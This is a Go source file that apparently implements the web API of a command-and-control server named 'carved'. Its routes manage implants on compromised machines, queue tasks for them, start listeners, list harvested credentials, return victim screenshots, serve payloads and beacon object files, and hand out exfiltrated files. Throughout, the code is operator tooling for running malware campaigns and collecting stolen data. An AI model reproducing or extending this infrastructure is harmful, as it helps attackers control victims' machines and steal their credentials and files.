package api

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/go-chi/chi/v5/middleware"

	"github.com/carved4/carved/server/pkg/db"
	"github.com/carved4/carved/server/pkg/listeners"
	"github.com/carved4/carved/server/pkg/web"
)

type Server struct {
	router   *chi.Mux
	listener *listeners.Manager
}

func NewServer(lm *listeners.Manager) *Server {
	s := &Server{
		router:   chi.NewRouter(),
		listener: lm,
	}
	s.setupRoutes()
	return s
}

func (s *Server) setupRoutes() {
	r := s.router

	r.Use(middleware.Recoverer)
	r.Use(middleware.Timeout(30 * time.Second))

	r.Use(func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Access-Control-Allow-Origin", "*")
			w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
			w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
			if r.Method == "OPTIONS" {
				w.WriteHeader(http.StatusOK)
				return
			}
			next.ServeHTTP(w, r)
		})
	})

	r.Get("/", s.servePanel)

	r.Post("/auth/login", s.handleLogin)
	r.Post("/auth/logout", s.handleLogout)
	r.Get("/auth/check", s.handleAuthCheck)

	r.Route("/api", func(r chi.Router) {
		r.Use(s.authMiddleware)

		r.Get("/implants", s.getImplants)
		r.Delete("/implants", s.clearImplants)
		r.Get("/implants/{id}", s.getImplant)
		r.Get("/implants/{id}/tasks", s.getImplantTasks)
		r.Post("/implants/{id}/tasks", s.createTask)
		r.Patch("/tasks/{id}/args", s.updateTaskArgs)

		r.Get("/listeners", s.getListeners)
		r.Post("/listeners", s.createListener)
		r.Delete("/listeners/{id}", s.deleteListener)
		r.Post("/listeners/{id}/start", s.startListener)
		r.Post("/listeners/{id}/stop", s.stopListener)

		r.Get("/credentials", s.getCredentials)

		r.Get("/screenshots", s.getScreenshots)
		r.Get("/screenshots/{id}", s.getScreenshot)

		r.Get("/bofs", s.listBOFs)
		r.Get("/bofs/{filename}", s.getBOF)

		r.Get("/exfil", s.listExfil)
		r.Get("/exfil/{filename}", s.getExfil)
	})

	r.Get("/payloads/{filename}", s.servePayload)

	r.Get("/health", func(w http.ResponseWriter, r *http.Request) {
		json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
	})
}

func (s *Server) Router() *chi.Mux {
	return s.router
}

func (s *Server) authMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		session := web.GetSessionFromRequest(r)
		if session == "" || !web.ValidateSession(session) {
			respondError(w, http.StatusUnauthorized, "unauthorized")
			return
		}
		next.ServeHTTP(w, r)
	})
}

func (s *Server) handleLogin(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		respondError(w, http.StatusBadRequest, "invalid json")
		return
	}

	if req.Username != web.DefaultUsername || req.Password != web.DefaultPassword {
		respondError(w, http.StatusUnauthorized, "invalid credentials")
		return
	}

	token := web.GenerateSession()
	web.CreateSession(token)

	http.SetCookie(w, &http.Cookie{
		Name:     "session",
		Value:    token,
		Path:     "/",
		HttpOnly: true,
		MaxAge:   86400,
		SameSite: http.SameSiteLaxMode,
	})

	respondJSON(w, map[string]string{"status": "ok"})
}

func (s *Server) handleLogout(w http.ResponseWriter, r *http.Request) {
	session := web.GetSessionFromRequest(r)
	if session != "" {
		web.DeleteSession(session)
	}

	http.SetCookie(w, &http.Cookie{
		Name:   "session",
		Value:  "",
		Path:   "/",
		MaxAge: -1,
	})

	respondJSON(w, map[string]string{"status": "ok"})
}

func (s *Server) handleAuthCheck(w http.ResponseWriter, r *http.Request) {
	session := web.GetSessionFromRequest(r)
	if session == "" || !web.ValidateSession(session) {
		respondError(w, http.StatusUnauthorized, "unauthorized")
		return
	}
	respondJSON(w, map[string]string{"status": "ok"})
}

func (s *Server) servePanel(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write([]byte(web.Panel()))
}

func (s *Server) getImplants(w http.ResponseWriter, r *http.Request) {
	implants, err := db.GetAllImplants()
	if err != nil {
		respondError(w, http.StatusInternalServerError, err.Error())
		return
	}

	const deadThreshold = 120 * time.Second
	now := time.Now().UTC()

	for _, implant := range implants {
		implant.Alive = now.Sub(implant.LastSeen.UTC()) < deadThreshold
	}

	respondJSON(w, implants)
}

func (s *Server) getImplant(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	implant, err := db.GetImplant(id)
	if err != nil {
		respondError(w, http.StatusNotFound, "implant not found")
		return
	}
	respondJSON(w, implant)
}

func (s *Server) clearImplants(w http.ResponseWriter, r *http.Request) {
	if err := db.ClearImplants(); err != nil {
		respondError(w, http.StatusInternalServerError, err.Error())
		return
	}
	respondJSON(w, map[string]string{"status": "cleared"})
}

func (s *Server) getImplantTasks(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	tasks, err := db.GetTasksForImplant(id)
	if err != nil {
		respondError(w, http.StatusInternalServerError, err.Error())
		return
	}

	type TaskResponse struct {
		ID        string `json:"id"`
		ImplantID string `json:"implant_id"`
		Type      string `json:"type"`
		Args      string `json:"args"`
		Status    string `json:"status"`
		Output    string `json:"output"`
		Error     string `json:"error"`
		Created   string `json:"created"`
		Completed string `json:"completed,omitempty"`
	}

	var response []TaskResponse
	for _, t := range tasks {
		tr := TaskResponse{
			ID:        t.ID,
			ImplantID: t.ImplantID,
			Type:      string(t.Type),
			Args:      t.Args,
			Status:    string(t.Status),
			Error:     t.Error,
			Created:   t.Created.Format(time.RFC3339),
		}
		if len(t.Output) > 0 {
			tr.Output = base64.StdEncoding.EncodeToString(t.Output)
		}
		if t.Completed != nil {
			tr.Completed = t.Completed.Format(time.RFC3339)
		}
		response = append(response, tr)
	}

	respondJSON(w, response)
}

func (s *Server) createTask(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")

	var req CreateTaskRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		respondError(w, http.StatusBadRequest, "invalid json")
		return
	}

	task, err := db.CreateTask(id, req.Type, req.Args, req.Data)
	if err != nil {
		respondError(w, http.StatusInternalServerError, err.Error())
		return
	}

	respondJSON(w, task)
}

func (s *Server) updateTaskArgs(w http.ResponseWriter, r *http.Request) {
	taskID := chi.URLParam(r, "id")

	var req struct {
		Args []string `json:"args"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		respondError(w, http.StatusBadRequest, "invalid json")
		return
	}

	if err := db.UpdateTaskArgs(taskID, req.Args); err != nil {
		respondError(w, http.StatusInternalServerError, err.Error())
		return
	}

	respondJSON(w, map[string]string{"status": "ok"})
}

func (s *Server) getListeners(w http.ResponseWriter, r *http.Request) {
	listeners, err := db.GetAllListeners()
	if err != nil {
		respondError(w, http.StatusInternalServerError, err.Error())
		return
	}

	for _, l := range listeners {
		l.Active = s.listener.IsActive(l.ID)
	}

	respondJSON(w, listeners)
}

func (s *Server) createListener(w http.ResponseWriter, r *http.Request) {
	var req CreateListenerRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		respondError(w, http.StatusBadRequest, "invalid json")
		return
	}

	l := &db.Listener{
		Name:    req.Name,
		Type:    req.Type,
		Host:    req.Host,
		Port:    req.Port,
		Created: time.Now(),
	}

	if err := db.SaveListener(l); err != nil {
		respondError(w, http.StatusInternalServerError, err.Error())
		return
	}

	respondJSON(w, l)
}

func (s *Server) deleteListener(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")

	s.listener.Stop(id)

	if err := db.DeleteListener(id); err != nil {
		respondError(w, http.StatusInternalServerError, err.Error())
		return
	}

	respondJSON(w, map[string]string{"status": "deleted"})
}

func (s *Server) startListener(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")

	l, err := db.GetListener(id)
	if err != nil {
		respondError(w, http.StatusNotFound, "listener not found")
		return
	}

	if err := s.listener.Start(l); err != nil {
		respondError(w, http.StatusInternalServerError, err.Error())
		return
	}

	respondJSON(w, l)
}

func (s *Server) stopListener(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")

	if err := s.listener.Stop(id); err != nil {
		respondError(w, http.StatusInternalServerError, err.Error())
		return
	}

	respondJSON(w, map[string]string{"status": "stopped"})
}

func (s *Server) getCredentials(w http.ResponseWriter, r *http.Request) {
	creds, err := db.GetAllCredentials()
	if err != nil {
		respondError(w, http.StatusInternalServerError, err.Error())
		return
	}
	respondJSON(w, creds)
}

func (s *Server) getScreenshots(w http.ResponseWriter, r *http.Request) {
	loot, err := db.GetAllLoot()
	if err != nil {
		respondError(w, http.StatusInternalServerError, err.Error())
		return
	}

	// Return metadata only, not the binary data
	type ScreenshotMeta struct {
		ID        string    `json:"id"`
		ImplantID string    `json:"implant_id"`
		Name      string    `json:"name"`
		Size      int       `json:"size"`
		Created   time.Time `json:"created"`
	}

	var screenshots []ScreenshotMeta
	for _, l := range loot {
		if l.Type == db.LootScreenshot {
			screenshots = append(screenshots, ScreenshotMeta{
				ID:        l.ID,
				ImplantID: l.ImplantID,
				Name:      l.Name,
				Size:      len(l.Data),
				Created:   l.Created,
			})
		}
	}
	respondJSON(w, screenshots)
}

func (s *Server) getScreenshot(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	loot, err := db.GetLoot(id)
	if err != nil {
		respondError(w, http.StatusNotFound, "screenshot not found")
		return
	}
	if loot.Type != db.LootScreenshot {
		respondError(w, http.StatusNotFound, "not a screenshot")
		return
	}

	w.Header().Set("Content-Type", "image/jpeg")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(loot.Data)))
	w.Write(loot.Data)
}

func (s *Server) listBOFs(w http.ResponseWriter, r *http.Request) {
	entries, err := os.ReadDir("BOFs")
	if err != nil {
		respondJSON(w, []string{})
		return
	}

	var bofList []map[string]interface{}
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		if !strings.HasSuffix(name, ".o") {
			continue
		}
		info, _ := e.Info()
		size := int64(0)
		if info != nil {
			size = info.Size()
		}
		bofList = append(bofList, map[string]interface{}{
			"name": name,
			"size": size,
		})
	}
	respondJSON(w, bofList)
}

func (s *Server) getBOF(w http.ResponseWriter, r *http.Request) {
	filename := chi.URLParam(r, "filename")

	if filepath.Base(filename) != filename || !strings.HasSuffix(filename, ".o") {
		respondError(w, http.StatusBadRequest, "invalid filename")
		return
	}

	bofPath := filepath.Join("BOFs", filename)
	data, err := os.ReadFile(bofPath)
	if err != nil {
		respondError(w, http.StatusNotFound, "BOF not found")
		return
	}

	respondJSON(w, map[string]interface{}{
		"name": filename,
		"data": base64.StdEncoding.EncodeToString(data),
		"size": len(data),
	})
}

func (s *Server) servePayload(w http.ResponseWriter, r *http.Request) {
	filename := chi.URLParam(r, "filename")

	if filepath.Base(filename) != filename {
		respondError(w, http.StatusBadRequest, "invalid filename")
		return
	}

	payloadPath := filepath.Join("payloads", filename)

	if _, err := os.Stat(payloadPath); os.IsNotExist(err) {
		respondError(w, http.StatusNotFound, "payload not found")
		return
	}

	http.ServeFile(w, r, payloadPath)
}

func (s *Server) listExfil(w http.ResponseWriter, r *http.Request) {
	exfilDir := filepath.Join("uploads", "exfil")
	entries, err := os.ReadDir(exfilDir)
	if err != nil {
		if os.IsNotExist(err) {
			respondJSON(w, []interface{}{})
			return
		}
		respondError(w, http.StatusInternalServerError, err.Error())
		return
	}

	var exfilList []map[string]interface{}
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		info, _ := e.Info()
		size := int64(0)
		modTime := time.Time{}
		if info != nil {
			size = info.Size()
			modTime = info.ModTime()
		}
		exfilList = append(exfilList, map[string]interface{}{
			"name":    e.Name(),
			"size":    size,
			"created": modTime,
		})
	}
	respondJSON(w, exfilList)
}

func (s *Server) getExfil(w http.ResponseWriter, r *http.Request) {
	filename := chi.URLParam(r, "filename")
	if filepath.Base(filename) != filename {
		respondError(w, http.StatusBadRequest, "invalid filename")
		return
	}

	exfilPath := filepath.Join("uploads", "exfil", filename)
	if _, err := os.Stat(exfilPath); os.IsNotExist(err) {
		respondError(w, http.StatusNotFound, "file not found")
		return
	}

	http.ServeFile(w, r, exfilPath)
}

func respondJSON(w http.ResponseWriter, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(Response{
		Success: true,
		Data:    data,
	})
}

func respondError(w http.ResponseWriter, code int, message string) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	json.NewEncoder(w).Encode(Response{
		Success: false,
		Error:   message,
	})
}
